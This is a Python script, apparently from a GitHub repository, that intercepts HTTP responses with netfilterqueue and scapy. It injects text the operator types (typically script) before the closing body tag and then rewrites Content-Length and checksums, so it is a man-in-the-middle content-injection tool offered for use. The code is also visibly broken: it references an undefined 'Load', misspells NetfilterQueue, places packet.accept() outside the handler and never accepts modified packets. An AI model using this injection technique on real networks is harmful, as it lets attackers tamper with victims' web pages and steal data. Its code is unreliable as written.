from scapy.all import  *

from colorama import init, Fore
import netfilterqueue
import re

# init colorama
init()

# define color
GREEN = Fore.GREEN
RESET = Fore.RESET

# HTTP packet inject
# github.com/veldanava

def process(packet):
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].sport == 80:
            # http response
            print(f"[UwU] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try: 
                load = spacket[Raw].load.decode()
            except Exception as e:
                packet.accept()
                return
        
            # input injection code
            added_text = input("^u^-> ")
            added_text_length = len(added_text)
        
            load = load.replace("</body>", added_text + "</body>")
        
            if  "Content-Length" in Load:
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                # recalculate
                new_content_length = content_length + added_text_length
                # repalce to header
                load = re.sub(r"Content-Length: .*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                # print message if injected
            if added_text in load:
                print(f"{GREEN}[UwU] Inject Success To {spacket[IP].dst}{RESET} Oniisan")
        
        # set new data
        spacket[Raw].load = load
        # set IP length
        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None 
        # set packet to netfilter UwU
        packet.set_payload(bytes(spacket))

# accept packet
packet.accept()

if __name__ == "__main__":
    # init queue
    queue = netfilterqueue.NetfiterQueue()
    # bind to process function
    queue.bind(0, process)
    # start
    queue.run()
